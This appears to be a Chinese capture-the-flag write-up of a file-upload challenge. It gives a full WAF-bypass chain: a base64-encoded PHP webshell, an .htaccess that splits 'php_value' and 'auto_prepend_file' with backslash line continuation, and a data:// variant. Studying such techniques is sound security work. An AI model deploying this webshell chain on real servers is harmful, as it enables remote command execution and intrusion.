## 二、题目限制

这是一道 upload 题。WAF 拦截：

```text
<                 -> 不能写 <?php
php_value         -> 不能直接写 PHP 配置
auto_prepend_file -> 不能直接自动包含
auto_append_file  -> 同上
```

其他情况：

```text
.htaccess 能生效
AddType 能改 MIME
CGI 不执行
没有 include
```

## 三、失败过的路线

### 1. 图片马

```php
<?php system($_GET['c']); ?>
```

WAF 检测到 `<`，上传被拒。

### 2. 直接写 `.htaccess`

```apache
php_value auto_prepend_file "..."
```

WAF 检测到 `php_value` / `auto_prepend_file`，上传被拒。

### 3. CGI

```apache
Options +ExecCGI
AddHandler cgi-script .png
```

上传 shell 脚本后访问，始终返回脚本源码，`mod_cgi` 没开或 `ExecCGI` 不生效。

### 4. include

题目没有 include 点，`php://filter` 不能单独执行。

## 四、成功路线

### 1. 上传 `a.b64`

内容只有一行：

```text
PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+
```

这是：

```php
<?php system($_GET['c']); ?>
```

的 base64。

特点：

```text
没有 <
没有 php_value
没有 auto_prepend_file
```

所以 WAF 不拦。

### 2. 上传 `.htaccess`

内容：

```apache
AddType application/x-httpd-php .png
php_\
value auto_\
prepend_file "php://filter/convert.base64-decode/resource=uploads/a.b64"
```

关键：

- `php_\` + `value` 续行成 `php_value`；
- `auto_\` + `prepend_file` 续行成 `auto_prepend_file`；
- WAF 按行看，只看到 `php_`、`auto_`，拦不到完整指令；
- Apache 会把续行拼起来，按完整指令执行。

### 3. 上传正常 `x.png`

普通图片即可，不需要写任何代码。

### 4. 访问

```text
http://目标/uploads/x.png?c=id
```

执行链：

```text
x.png 被 AddType 成 PHP
-> 先执行 auto_prepend_file
-> 读取 uploads/a.b64
-> base64 解码
-> 得到 <?php system($_GET['c']); ?>
-> 执行 c=id
```

## 五、报错与修正

### 1. `failed to open stream`

```text
Failed opening required 'php://filter/convert.base64-decode/resource=a.b64'
```

原因：

```text
a.b64 路径不对
```

修正：

```apache
resource=uploads/a.b64
```

或绝对路径：

```apache
resource=/var/www/html/uploads/a.b64
```

### 2. `Cannot execute a blank command`

```text
system(): Cannot execute a blank command
```

原因：

```text
payload 已执行，但请求没带 c
```

修正：

```text
/uploads/x.png?c=id
```

### 3. 404

原因：

```text
访问路径不是 upload，而是 uploads
```

修正：

```text
/uploads/x.png
```

## 六、原理

### 1. 反斜杠续行

Apache 配置：

```apache
php_\
value
```

会被拼成：

```apache
php_value
```

WAF 看到的是：

```text
php_
value
```

看不到完整敏感词。

`auto_prepend_file` 同理：

```apache
auto_\
prepend_file
```

这是 **WAF 与 Apache 解析不一致**。

### 2. `AddType`

```apache
AddType application/x-httpd-php .png
```

让 `.png` 交给 PHP 解析。

没有它，`x.png` 只是普通图片，`auto_prepend_file` 不会启动。

### 3. `auto_prepend_file`

```apache
auto_prepend_file "php://filter/convert.base64-decode/resource=uploads/a.b64"
```

在 PHP 执行主脚本之前，先加载并解码 `a.b64`，再执行里面的 PHP 代码。

### 4. `php://filter`

`a.b64` 不是 PHP 代码，只是 base64 文本。

直接 include 只会输出 base64。

加：

```text
php://filter/convert.base64-decode/resource=...
```

PHP 先解码，再 include，得到真正的 webshell。

## 七、三个文件的作用

| 文件 | 作用 | 缺了会怎样 |
|---|---|---|
| `a.b64` | 藏 payload，绕过 `<` | 没有可执行代码 |
| `.htaccess` | `.png` 按 PHP 解析，并自动加载 `a.b64` | `x.png` 只是图片，payload 不执行 |
| `x.png` | 触发 PHP 的入口 | 没有请求让 `auto_prepend_file` 跑起来 |

## 八、两文件替代方案

如果 `allow_url_include=On`，可以把 payload 直接写进 `.htaccess`：

```apache
AddType application/x-httpd-php .png
php_\
value auto_\
prepend_file "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+"
```

这样只需要：

```text
.htaccess
x.png
```

如果 `allow_url_include=Off`，就必须用 `a.b64`。

## 九、一句话

```text
a.b64 躲 <
.htaccess 反斜杠续行躲 php_value / auto_prepend_file
AddType 让 png 按 PHP 解析
auto_prepend_file 解码 a.b64
访问 x.png?c=id 拿 shell
```
